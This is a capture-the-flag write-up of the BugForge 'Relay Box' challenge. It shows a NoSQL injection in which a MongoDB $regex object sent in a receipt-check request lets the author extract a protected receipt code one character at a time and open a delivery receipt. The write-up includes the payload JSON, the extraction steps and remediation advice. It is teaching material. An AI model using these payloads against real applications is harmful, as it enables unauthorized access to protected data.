# Relay Box  — relaybox-007 — Regex.

## Overview

- **Challenge:** Relay Box
- **Platform:** BugForge
- **Category:** Web / NoSQL Injection
- **Hint:** Regex
- **Vulnerability:** NoSQL Injection using MongoDB `$regex` operator
- **Impact:** Unauthorized receipt-code extraction and access to protected delivery receipts

## 1. Initial Reconnaissance

After opening the web application, I registered a test account and inspected the HTTP traffic using browser Developer Tools.

### Authentication Endpoint

```http
GET /api/auth/me
```

The response contained the authenticated user's details, including:

```json
{
  "user": {
    "role": "admin"
  }
}
```

### Shipment Enumeration

```http
GET /api/shipments
```

The response revealed multiple shipment references:

| Shipment Reference | Recipient              | Status           |
| ------------------ | ---------------------- | ---------------- |
| RB-2041-AC         | Your account           | In transit       |
| RB-1899-ZL         | Your account           | Out for delivery |
| RB-DEMO-01         | RelayBox Demo Depot    | Delivered        |
| RB-7731-KM         | Marigold Lane Pharmacy | Delivered        |

The demonstration shipment exposed a public receipt code:

```text
RBX-a1b2c3
```

## 2. Receipt Functionality

Two endpoints were identified:

### Check Receipt

```http
POST /api/receipts/check
```

Example request:

```json
{
  "shipmentRef": "RB-DEMO-01",
  "code": "RBX-a1b2c3"
}
```

Response:

```json
{
  "shipmentRef": "RB-DEMO-01",
  "valid": true
}
```

### Open Receipt

```http
POST /api/receipts/open
```

The endpoint returned the proof of delivery when a valid receipt code was provided.

## 3. Vulnerability Discovery

The receipt validation endpoint accepted JSON objects where a string was expected.

### Normal Request

```json
{
  "shipmentRef": "RB-7731-KM",
  "code": "RBX-a1b2c3"
}
```

Response:

```json
{
  "shipmentRef": "RB-7731-KM",
  "valid": false
}
```

### NoSQL Injection Payload

```json
{
  "shipmentRef": "RB-7731-KM",
  "code": {
    "$regex": "^RBX"
  }
}
```

Response:

```json
{
  "shipmentRef": "RB-7731-KM",
  "valid": true
}
```

The `$regex` operator was interpreted as a database query operator instead of a literal receipt code.

This confirmed a NoSQL injection vulnerability.

## 4. Exploitation Methodology

The receipt code was extracted using blind regex-based enumeration.

### Character-by-Character Extraction

The extraction process:

1. Start with the known prefix `RBX-`.
2. Test possible characters using `$regex`.
3. Identify the character that produces `valid: true`.
4. Append the discovered character to the prefix.
5. Repeat until the entire receipt code is recovered.

Example:

```json
{
  "shipmentRef": "RB-7731-KM",
  "code": {
    "$regex": "^RBX-8"
  }
}
```

Continue testing until the complete receipt code is identified.

## 5. Automated Extraction

A Python script using the `requests` library automated the extraction.

The script:

- Maintained the authenticated session cookie.
- Sent requests to `/api/receipts/check`.
- Tested candidate characters against regex prefixes.
- Extended the prefix when a match was found.
- Checked for the complete receipt code.

### Extracted Receipt Code

```text
RBX-8c0ae6
```

## 6. Accessing the Protected Receipt

The recovered code was used against:

```http
POST /api/receipts/open
```

Request:

```json
{
  "shipmentRef": "RB-7731-KM",
  "code": "RBX-8c0ae6"
}
```

The application returned the proof of delivery.

### Receipt Details

| Field     | Value                     |
| --------- | ------------------------- |
| Shipment  | RB-7731-KM                |
| Recipient | Marigold Lane Pharmacy    |
| Address   | 14 Marigold Lane, Keswick |
| Carrier   | RelayBox Secure           |
| Signed by | P. Raman                  |
| Parcels   | 1                         |

The delivery note contained the challenge flag.

## 7. Flag

```text
bug{SoUaRDVLyeBkpCo0EJkamEYsHlLX8CkX}
```

## 8. Root Cause

The application failed to validate the type of the receipt code.

Instead of enforcing a string, the backend accepted an attacker-controlled object containing a MongoDB query operator.

This allowed the database to evaluate attacker-controlled regex expressions.

### Security Impact

- Receipt-code validation bypass
- Blind extraction of receipt codes
- Unauthorized access to protected delivery receipts
- Exposure of sensitive delivery information

## 9. Remediation

Recommended security controls:

- Validate receipt codes strictly as strings.
- Reject objects and arrays where strings are expected.
- Never allow user-controlled MongoDB operators.
- Use safe database query construction.
- Apply authorization checks independently to receipt access.
- Rate-limit receipt validation attempts.
- Monitor repeated validation failures and suspicious regex patterns.

## Conclusion

The Relay Box challenge demonstrated how NoSQL injection can be exploited through a regex-based validation endpoint.

By abusing the `$regex` operator, I extracted a protected receipt code character by character and accessed the corresponding delivery receipt to retrieve the flag.